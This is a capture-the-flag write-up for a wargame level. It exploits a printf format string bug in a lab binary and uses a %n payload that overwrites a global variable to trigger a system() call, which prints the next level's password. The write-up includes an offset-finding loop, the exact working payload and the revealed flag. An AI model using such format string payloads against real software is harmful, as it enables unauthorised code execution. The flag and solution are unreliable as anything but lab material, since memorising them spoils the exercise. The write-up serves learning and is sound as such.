# level4

Nothing of note with `ll` and `checksec`.

Functions found using `gdb > info functions`
|LIBC|user|
|-|-|
|printf|main|
|fgets|frame_dummy|
|system|p|
||n|

We see the `fgets` function. We will not be able to exploit it.
We will have to exploit the `printf()` and `system()` duo then.

As always, `frame_dummy()` does nothing.

`main()` calls `n()`.
`n()` is almost indentical to the `v()` function in the previous level. The only difference is that instead of calling `printf()` directly, it goes through the `p()` function.

Once again, we will have to set the `m` variable to a specific value in order to access the `system()` function call. This time, the function call prints **level5**'s password directly instead of opening a shell.

**m** now has to have a value of `16930116` to pass the check which is a lot more than `64`.

Let's get the address of **m** from **Ghidra** directly, `0x08049810` becomes `\x10\x98\x04\x08` in writable little endian.

Since the `printf()` is located in the `p()` function, this means that the address of the buffer is located higher on the stack we need to print more values on the stack. Let's go **EGG hunting** with a loop this time!

```sh
for i in $(seq 1 100); do (echo -n "i=$i  "; echo "AAAA %$i\$x" | ./level4) ; done
```

We see that the **EGG** *41414141* is located at the 12th argument. Now we just take our injector from the previous level, take the address of **m** we got earlier, add the padding, then set the index of the argument that matches our buffer's address. Our payload looks like this

|address of m|padding|targeting the 12th argument|
|-|-|-|
|\x10\x98\x04\x08|%16930112d|%12$n|

```sh
python -c 'print "\x10\x98\x04\x08%16930112d%12$n"' | ./level4
[...]
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

We now have our flag, let's switch to the next level!
```sh
su level5
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

All in all this level was a slightly above the previous one in terms of difficulty, I tried handling it differently this time.
I could also have written the value of **m** in it's upper and lower halves separately so as to not write 17Mio characters and not get flooded by `printf()` printing.

NOTE:
I removed the `(cat <(...) - )` part since we do not need to open a shell this time.
